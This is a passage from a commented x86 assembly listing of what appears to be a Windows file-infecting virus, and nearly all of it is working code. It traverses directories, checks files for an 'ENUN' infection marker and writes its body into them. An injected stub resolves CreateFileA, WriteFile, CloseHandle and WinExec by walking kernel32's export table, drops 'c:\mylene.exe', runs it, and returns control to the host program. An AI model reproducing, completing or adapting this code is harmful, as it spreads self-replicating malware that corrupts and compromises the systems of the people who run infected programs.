    016D1  72 E5				jb	loc_25			; Jump if below
    016D3  80 3D 000070C8 04			cmp	byte ptr data_65,4	; (070C8=0)
    016DA  0F 82 000005A7			jb	loc_50			; Jump if below
    016E0  81 25 000070BF     +			and	dword ptr data_62,0FFF7h	; (070BF=0)
           0000FFF7
    016EA  C6 05 00007C8F C3			mov	byte ptr data_73,0C3h	; (07C8F=0)


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                              SUBROUTINE
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    01BFD			sub_15		proc	near
    01BFD  60					pushad				; Save all regs
    01BFE  8B CF				mov	ecx,edi
    01C00  2B CE				sub	ecx,esi
    01C02  8D BE FFFE7B8C			lea	edi,dword ptr ds:[0FFFE7B8Ch][esi]	; Load effective addr
    01C08  FC					cld				; Clear direction
    01C09  F3/ A4				rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
    01C0B  61					popad				; Restore all regs
    01C0C  C3					retn
				sub_15		endp

    01C0D  00001A4D		data_10		dd	01A4Dh
    01C11  81 1A 00 00 AD 1A			db	 81h, 1Ah, 00h, 00h,0ADh, 1Ah
    01C17  00 00 D5 1A 00 00			db	 00h, 00h,0D5h, 1Ah, 00h, 00h
    01C1D  0B 1B 00 00 16 1B			db	 0Bh, 1Bh, 00h, 00h, 16h, 1Bh
    01C23  00 00 54 1B 00 00			db	 00h, 00h, 54h, 1Bh, 00h, 00h
    01C29  66 1B 00 00 9E 1B			db	 66h, 1Bh, 00h, 00h, 9Eh, 1Bh
    01C2F  00 00 4D 1A 00 00			db	 00h, 00h, 4Dh, 1Ah, 00h, 00h
    01C35  4D 1A 00 00 9E 1B			db	 4Dh, 1Ah, 00h, 00h, 9Eh, 1Bh
    01C3B  00 00 9E 1B 00 00			db	 00h, 00h, 9Eh, 1Bh, 00h, 00h
    01C41  9E 1B 00 00 4D 1A			db	 9Eh, 1Bh, 00h, 00h, 4Dh, 1Ah
    01C47  00 00 4D 1A 00 00			db	 00h, 00h, 4Dh, 1Ah, 00h, 00h
    01C4D  C081E881		data_11		dd	0C081E881h
    01C51  81 F0 81 E8 81 E0			db	 81h,0F0h, 81h,0E8h, 81h,0E0h
    01C57  81 C8 C7 C0 81 E8			db	 81h,0C8h,0C7h,0C0h, 81h,0E8h
    01C5D  D1 E8 D1 E0 D1 C0			db	0D1h,0E8h,0D1h,0E0h,0D1h,0C0h
    01C63  D1 C8 F7 D8 F7 D0			db	0D1h,0C8h,0F7h,0D8h,0F7h,0D0h
    01C69  FF C8 FF C0				db	0FFh,0C8h,0FFh,0C0h
    01C6D			loc_49:
    01C6D  B9 00000BB8				mov	ecx,0BB8h
    01C72  BE 0001F54C				mov	esi,1F54Ch
    01C77  BF 00016994				mov	edi,16994h
    01C7C  FC					cld				; Clear direction
    01C7D  F3/ A4				rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
    01C7F  F8					clc				; Clear carry flag
    01C80  C6 05 000031AF 01			mov	byte ptr data_43,1	; (031AF=0)
    01C87			loc_50:
    01C87  61					popad				; Restore all regs
    01C88			loc_51:
    01C88  72 5D				jc	short loc_54		; Jump if carry Set
    01C8A			loc_52:
    01C8A ˙51					push	ecx
    01C8B  6A 00				push	dword ptr 0
    01C8D  6A 00				push	dword ptr 0
    01C8F  6A 00				push	dword ptr 0
    01C91  53					push	ebx
    01C92  E8 000003FC				call	jmp_SetFilePointer	; (02093)
    01C97  6A 00				push	dword ptr 0
    01C99  68 0000709F				push	709Fh
    01C9E  68 00004000				push	4000h
    01CA3  68 0001754C				push	1754Ch
    01CA8  53					push	ebx
    01CA9  E8 00000367				call	jmp_WriteFile		; (02015)
    01CAE  59					pop	ecx
    01CAF  6A 00				push	dword ptr 0
    01CB1  6A 00				push	dword ptr 0
    01CB3  51					push	ecx
    01CB4  53					push	ebx
    01CB5  E8 000003D9				call	jmp_SetFilePointer	; (02093)
    01CBA  B8 00007DDC				mov	eax,7DDCh
    01CBF  80 3D 000031AF 00			cmp	byte ptr data_43,0	; (031AF=0)
    01CC6  74 0C				je	short loc_53		; Jump if equal
    01CC8  C6 05 000031AF 00			mov	byte ptr data_43,0	; (031AF=0)
    01CCF  B8 0000F994				mov	eax,0F994h
    01CD4			loc_53:
    01CD4  6A 00				push	dword ptr 0
    01CD6  68 0000709F				push	709Fh
    01CDB  68 00007BB8				push	7BB8h
    01CE0  50					push	eax
    01CE1  53					push	ebx
    01CE2  E8 0000032E				call	jmp_WriteFile		; (02015)
    01CE7			loc_54:
    01CE7 ˙53					push	ebx
    01CE8  E8 0000032E				call	jmp_CloseHandle		; (0201B)
    01CED			loc_55:
    01CED  5E					pop	esi
    01CEE  E9 FFFFF7A7				jmp	loc_19			; (0149A)
    01CF3			loc_56:
    01CF3  8D BE 000205E0			lea	edi,dword ptr data_88[esi]	; (205E0=0) Load effective addr
    01CF9  80 3F 2E				cmp	byte ptr [edi],2Eh	; '.'
    01CFC  0F 84 FFFFF798			je	loc_19			; Jump if equal
    01D02  57					push	edi
    01D03  E8 0000037F				call	jmp_SetCurrentDirectoryA	; (02087)
    01D08  85 C0				test	eax,eax
    01D0A  74 0B				jz	short loc_57		; Jump if zero
    01D0C  81 C6 00000258			add	esi,258h
    01D12  E8 FFFFF762				call	sub_1			; (01479)
    01D17			loc_57:
    01D17  E9 FFFFF77E				jmp	loc_19			; (0149A)

				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                              SUBROUTINE
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    01D1C			sub_16		proc	near
    01D1C  50					push	eax
    01D1D  52					push	edx
    01D1E  8B C1				mov	eax,ecx
    01D20  33 D2				xor	edx,edx			; Zero register
    01D22  F7 75 00				div	dword ptr [ebp+0]	; ax,dxrem=dx:ax/data
    01D25  85 D2				test	edx,edx
    01D27  74 01				jz	short loc_58		; Jump if zero
    01D29  40					inc	eax
    01D2A			loc_58:
    01D2A  F7 65 00				mul	dword ptr [ebp+0]	; dx:ax = data * ax
    01D2D  91					xchg	ecx,eax
    01D2E  5A					pop	edx
    01D2F  58					pop	eax
    01D30  C3					retn
				sub_16		endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                              SUBROUTINE
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    01D31			sub_17		proc	near
    01D31  60					pushad				; Save all regs
    01D32  BE 0001754C				mov	esi,1754Ch
    01D37  BF 0001B54C				mov	edi,1B54Ch
    01D3C  73 02				jnc	short loc_59		; Jump if carry=0
    01D3E  87 F7				xchg	esi,edi
    01D40			loc_59:
    01D40  B9 00001000				mov	ecx,1000h
    01D45  FC					cld				; Clear direction
    01D46  F3/ A5				rep	movsd			; Rep when cx >0 Mov [si] to es:[di]
    01D48  61					popad				; Restore all regs
    01D49  C3					retn
				sub_17		endp

    01D4A			loc_60:
    01D4A  8B 8E 000205D4			mov	ecx,dword ptr data_87[esi]	; (205D4=0)
    01D50  81 F9 0000EA60			cmp	ecx,0EA60h
    01D56  77 8F				ja	loc_54			; Jump if above
    01D58  81 F9 000007D0			cmp	ecx,7D0h
    01D5E  76 87				jbe	loc_54			; Jump if below or =
    01D60  8D 81 00000100			lea	eax,dword ptr ds:data_3e[ecx]	; (00100=0F000EC59h) Load effective ad
    01D66  A3 0000306E				mov	data_34,eax		; (0306E=0)
    01D6B  60					pushad				; Save all regs
    01D6C  60					pushad				; Save all regs
    01D6D  8D 81 00007BB8			lea	eax,dword ptr data_72[ecx]	; (07BB8=0BF240000h) Load effective ad
    01D73  33 D2				xor	edx,edx			; Zero register
    01D75  BB 00000200				mov	ebx,200h
    01D7A  F7 F3				div	ebx			; ax,dx rem=dx:ax/reg
    01D7C  40					inc	eax
    01D7D  66| A3 00003056			mov	data_32,ax		; (03056=0)
    01D83  66| 89 15 00003054			mov	word ptr data_31,dx	; (03054=0)
    01D8A  8B F7				mov	esi,edi
    01D8C  56					push	esi
    01D8D  BF 0000807C				mov	edi,807Ch
    01D92  B9 000000D8				mov	ecx,0D8h
    01D97  F3/ A5				rep	movsd			; Rep when cx >0 Mov [si] to es:[di]
    01D99  5F					pop	edi
    01D9A  BE 00003052				mov	esi,3052h
    01D9F  B9 0000004F				mov	ecx,4Fh
    01DA4  F3/ A4				rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
    01DA6  61					popad				; Restore all regs
    01DA7  83 E9 07				sub	ecx,7
    01DAA  6A 00				push	dword ptr 0
    01DAC  6A 00				push	dword ptr 0
    01DAE  51					push	ecx
    01DAF  53					push	ebx
    01DB0  E8 000002DE				call	jmp_SetFilePointer	; (02093)
    01DB5  6A 00				push	dword ptr 0
    01DB7  68 000070A7				push	70A7h
    01DBC  6A 04				push	dword ptr 4
    01DBE  68 000070AB				push	70ABh
    01DC3  53					push	ebx
    01DC4  E8 000002B8				call	jmp_ReadFile		; (02081)
    01DC9  81 3D 000070AB     +			cmp	dword ptr data_55,4E554E45h	; (070AB=0)
           4E554E45
    01DD3  75 06				jne	short loc_61		; Jump if not equal
    01DD5  61					popad				; Restore all regs
    01DD6  E9 FFFFFF0C				jmp	loc_54			; (01CE7)
    01DDB			loc_61:
    01DDB  61					popad				; Restore all regs
    01DDC  E9 FFFFFEA9				jmp	loc_52			; (01C8A)
    01DE1			loc_62:
    01DE1  FF B6 000207E0			push	dword ptr data_89[esi]	; (207E0=0)
    01DE7  E8 0000022F				call	jmp_CloseHandle		; (0201B)
    01DEC  68 000030D1				push	30D1h
    01DF1  E8 00000291				call	jmp_SetCurrentDirectoryA	; (02087)
    01DF6  81 EE 00000258			sub	esi,258h
    01DFC  74 01				jz	short loc_63		; Jump if zero
    01DFE  C3					retn
    01DFF			loc_63:
    01DFF  FE 05 000030C9			inc	byte ptr data_38	; (030C9=43h)
    01E05  E9 FFFFF64E				jmp	loc_18			; (01458)
    01E0A			loc_64:
    01E0A  E8 00000218				call	jmp_ExitProcess		; (02027)

				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                              SUBROUTINE
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    01E0F			sub_18		proc	near
    01E0F  80 3D 000070AF 01			cmp	byte ptr data_56,1	; (070AF=0)
    01E16  74 06				je	short loc_65		; Jump if equal
    01E18  E8 FFFFFBE8				call	sub_10			; (01A05)
    01E1D  C3					retn
    01E1E			loc_65:
    01E1E  33 05 00007ECC			xor	eax,dword ptr data_82	; (07ECC=23824FFh)
    01E24  C3					retn
				sub_18		endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                              SUBROUTINE
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    01E25			sub_19		proc	near
    01E25  60					pushad				; Save all regs
    01E26  E8 00000238				call	jmp_GetTickCount	; (02063)
    01E2B  32 C4				xor	al,ah
    01E2D  A8 07				test	al,7
    01E2F  61					popad				; Restore all regs
    01E30  C3					retn
				sub_19		endp

    01E31  E8 00 00 00 00			db	0E8h, 00h, 00h, 00h, 00h

				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                              SUBROUTINE
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    01E36			sub_20		proc	near
    01E36  5D					pop	ebp
    01E37  81 ED 00001E36			sub	ebp,1E36h
    01E3D  03 A5 00000A20			add	esp,dword ptr ss:data_5e[ebp]	; (00A20=0A8ECC92Bh)
    01E43  FC					cld				; Clear direction
    01E44  C7 85 00001FB7     +			mov	dword ptr ss:data_15[ebp],0	; (01FB7=0)
           00000000
    01E4E  C7 85 00001FBB     +			mov	dword ptr ss:data_16[ebp],0	; (01FBB=0)
           00000000
    01E58  BE BFF70000				mov	esi,0BFF70000h
    01E5D  8A 44 24 03				mov	al,byte ptr [esp+3]
    01E61  3C BF				cmp	al,0BFh
    01E63  74 05				je	short loc_66		; Jump if equal
    01E65  BE 77F00000				mov	esi,77F00000h
    01E6A			loc_66:
    01E6A  8B FE				mov	edi,esi
    01E6C  AD					lodsd				; String [si] to ax
    01E6D  66| 3D 5A4D				cmp	ax,5A4Dh
    01E71  0F 85 00000124			jne	loc_76			; Jump if not equal
    01E77  83 C6 7C				add	esi,7Ch
    01E7A  AD					lodsd				; String [si] to ax
    01E7B  3D 00004550				cmp	eax,4550h
    01E80  0F 85 00000115			jne	loc_76			; Jump if not equal
    01E86  8B 56 74				mov	edx,dword ptr [esi+74h]
    01E89  81 C6 000000DC			add	esi,0DCh
    01E8F			loc_67:
    01E8F  83 C6 24				add	esi,24h
    01E92  AD					lodsd				; String [si] to ax
    01E93  3B C2				cmp	eax,edx
    01E95  75 F8				jne	loc_67			; Jump if not equal
    01E97  8D 34 07				lea	esi,[edi][eax]		; Load effective addr
    01E9A  8B DE				mov	ebx,esi
    01E9C  8B 46 20				mov	eax,dword ptr [esi+20h]
    01E9F  8D 34 07				lea	esi,[edi][eax]		; Load effective addr
    01EA2  89 B5 00001FBF			mov	dword ptr ss:data_17[ebp],esi	; (01FBF=0)
    01EA8  89 BD 00001FC3			mov	dword ptr ss:data_18[ebp],edi	; (01FC3=0)
    01EAE			loc_68:
    01EAE ˙8B 4B 18				mov	ecx,dword ptr [ebx+18h]
    01EB1			loc_69:
    01EB1 ˙AD					lodsd				; String [si] to ax
    01EB2  8D 14 07				lea	edx,[edi][eax]		; Load effective addr
    01EB5  60					pushad				; Save all regs
    01EB6  8B F2				mov	esi,edx
    01EB8  8B BD 00001FB7			mov	edi,dword ptr ss:data_15[ebp]	; (01FB7=0)
    01EBE  8D BC 2F 00001FC7			lea	edi,dword ptr data_19[edi][ebp]	; (01FC7=61657243h) Load effective add
    01EC5  33 D2				xor	edx,edx			; Zero register
    01EC7  FC					cld				; Clear direction
    01EC8			loc_70:
    01EC8 ˙A6					cmpsb				; Cmp [si] to es:[di]
    01EC9  75 03				jnz	short loc_71		; Jump if not zero
    01ECB  42					inc	edx
    01ECC  EB FA				jmp	short loc_70		; (01EC8)
    01ECE			loc_71:
    01ECE  85 D2				test	edx,edx
    01ED0  74 61				jz	short loc_72		; Jump if zero
    01ED2  80 7E FE 00				cmp	byte ptr [esi-2],0
    01ED6  75 5B				jne	short loc_72		; Jump if not equal
    01ED8  80 7F FE 00				cmp	byte ptr [edi-2],0
    01EDC  75 55				jne	short loc_72		; Jump if not equal
    01EDE  8B 43 18				mov	eax,dword ptr [ebx+18h]
    01EE1  2B C1				sub	eax,ecx
    01EE3  D1 E0				shl	eax,1			; Shift w/zeros fill
    01EE5  8B 73 24				mov	esi,dword ptr [ebx+24h]
    01EE8  03 B5 00001FC3			add	esi,dword ptr ss:data_18[ebp]	; (01FC3=0)
    01EEE  03 F0				add	esi,eax
    01EF0  33 C0				xor	eax,eax			; Zero register
    01EF2  66| AD				lodsw				; String [si] to ax
    01EF4  8B 73 1C				mov	esi,dword ptr [ebx+1Ch]
    01EF7  03 B5 00001FC3			add	esi,dword ptr ss:data_18[ebp]	; (01FC3=0)
    01EFD  8B 04 86				mov	eax,[esi][eax*4]
    01F00  03 85 00001FC3			add	eax,dword ptr ss:data_18[ebp]	; (01FC3=0)
    01F06  8B 8D 00001FBB			mov	ecx,dword ptr ss:data_16[ebp]	; (01FBB=0)
    01F0C  89 84 8D 00001FF1			mov	dword ptr ss:data_22[ebp][ecx*4],eax	; (01FF1=0)
    01F13  81 EF 00001FC8			sub	edi,1FC8h
    01F19  2B FD				sub	edi,ebp
    01F1B  89 BD 00001FB7			mov	dword ptr ss:data_15[ebp],edi	; (01FB7=0)
    01F21  FF 85 00001FBB			inc	dword ptr ss:data_16[ebp]	; (01FBB=0)
    01F27  61					popad				; Restore all regs
    01F28  8B B5 00001FBF			mov	esi,dword ptr ss:data_17[ebp]	; (01FBF=0)
    01F2E  E9 FFFFFF7B				jmp	loc_68			; (01EAE)
    01F33			loc_72:
    01F33  61					popad				; Restore all regs
    01F34  83 BD 00001FBB 04			cmp	dword ptr ss:data_16[ebp],4	; (01FBB=0)
    01F3B  74 0B				je	short loc_75		; Jump if equal
    01F3D  E2 02				loopd	short locloop_73	; Loop if ecx > 0

    01F3F  EB 05				jmp	short loc_74		; (01F46)

    01F41			locloop_73:
    01F41  E9 FFFFFF6B				jmp	loc_69			; (01EB1)
    01F46			loc_74:
    01F46  EB 53				jmp	short loc_76		; (01F9B)
    01F48			loc_75:
    01F48  6A 00				push	dword ptr 0
    01F4A  6A 00				push	dword ptr 0
    01F4C  6A 02				push	dword ptr 2
    01F4E  6A 00				push	dword ptr 0
    01F50  6A 03				push	dword ptr 3
    01F52  68 C0000000				push	0C0000000h
    01F57  8D 85 00001FA9			lea	eax,dword ptr ss:data_13[ebp]	; (01FA9=6D5C3A63h) Load effective add
    01F5D  50					push	eax
    01F5E  FF 95 00001FF1			call	dword ptr ss:data_22[ebp]	; (01FF1=0)
    01F64  8B D8				mov	ebx,eax
    01F66  40					inc	eax
    01F67  74 32				jz	short loc_76		; Jump if zero
    01F69  6A 00				push	dword ptr 0
    01F6B  8D 85 00002005			lea	eax,dword ptr ss:data_27[ebp]	; (02005=0) Load effective addr
    01F71  50					push	eax
    01F72  68 00007BB8				push	7BB8h
    01F77  8D 85 00000A00			lea	eax,dword ptr ss:data_4e[ebp]	; (00A00=6E74D284h) Load effective add
    01F7D  50					push	eax
    01F7E  53					push	ebx
    01F7F  FF 95 00001FF5			call	dword ptr ss:data_23[ebp]	; (01FF5=0)
    01F85  53					push	ebx
    01F86  FF 95 00001FF9			call	dword ptr ss:data_24[ebp]	; (01FF9=0)
    01F8C  6A 00				push	dword ptr 0
    01F8E  8D 85 00001FA9			lea	eax,dword ptr ss:data_13[ebp]	; (01FA9=6D5C3A63h) Load effective add
    01F94  50					push	eax
    01F95  FF 95 00001FFD			call	dword ptr ss:data_25[ebp]	; (01FFD=0)
    01F9B			loc_76:
    01F9B  8B 85 00002001			mov	eax,dword ptr ss:data_26[ebp]	; (02001=11223344h)
    01FA1  33 85 00000AF0			xor	eax,dword ptr ss:data_6e[ebp]	; (00AF0=2EFF2E00h)
    01FA7  FF E0				jmp	eax			;*Register jump
    01FA9  6D5C3A63		data_13		dd	6D5C3A63h
    01FAD  79 6C 65 6E 65 2E			db	'ylene.exe'
    01FB3  65 78 65
    01FB6  00					db	0
    01FB7  00000000		data_15		dd	00000h
    01FBB  00000000		data_16		dd	00000h
    01FBF  00000000		data_17		dd	00000h
    01FC3  00000000		data_18		dd	00000h
    01FC7  61657243		data_19		dd	61657243h
    01FCB  74 65 46 69 6C 65			db	'teFileA', 0
    01FD1  41 00
    01FD3  57 72 69 74 65 46			db	'WriteFile', 0
    01FD9  69 6C 65 00
    01FDD  43 6C 6F 73 65 48			db	'CloseHandle', 0
    01FE3  61 6E 64 6C 65 00
    01FE9  57 69 6E 45 78 65			db	'WinExec'
    01FEF  63
    01FF0  00					db	0
    01FF1  00000000		data_22		dd	00000h
    01FF5  00000000		data_23		dd	00000h
    01FF9  00000000		data_24		dd	00000h
    01FFD  00000000		data_25		dd	00000h
    02001  11223344		data_26		dd	11223344h
    02005  00000000		data_27		dd	00000h

				;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

    02009			jmp_WinExec:
    02009  FF 25 000460E0			jmp	dword ptr WinExec	;*(460E0=0)
				sub_20		endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_VirtualFree
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    0200F			jmp_VirtualFree	proc	near
    0200F  FF 25 000460E4			jmp	dword ptr VirtualFree	;*(460E4=0)
				jmp_VirtualFree	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_WriteFile
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02015			jmp_WriteFile	proc	near
    02015  FF 25 000460E8			jmp	dword ptr WriteFile	;*(460E8=0)
				jmp_WriteFile	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_CloseHandle
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    0201B			jmp_CloseHandle	proc	near
    0201B  FF 25 000460EC			jmp	dword ptr CloseHandle	;*(460EC=0)
				jmp_CloseHandle	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_CreateFileA
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02021			jmp_CreateFileA	proc	near
    02021  FF 25 000460F0			jmp	dword ptr CreateFileA	;*(460F0=0)
				jmp_CreateFileA	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_ExitProcess
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02027			jmp_ExitProcess	proc	near
    02027  FF 25 000460F4			jmp	dword ptr ExitProcess	;*(460F4=0)
				jmp_ExitProcess	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_GetProcAddress
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    0202D			jmp_GetProcAddress	proc	near
    0202D  FF 25 000460F8			jmp	dword ptr GetProcAddress	;*(460F8=0)
				jmp_GetProcAddress	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_FindNextFileA
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02033			jmp_FindNextFileA	proc	near
    02033  FF 25 000460FC			jmp	dword ptr FindNextFileA	;*(460FC=0)
				jmp_FindNextFileA	endp


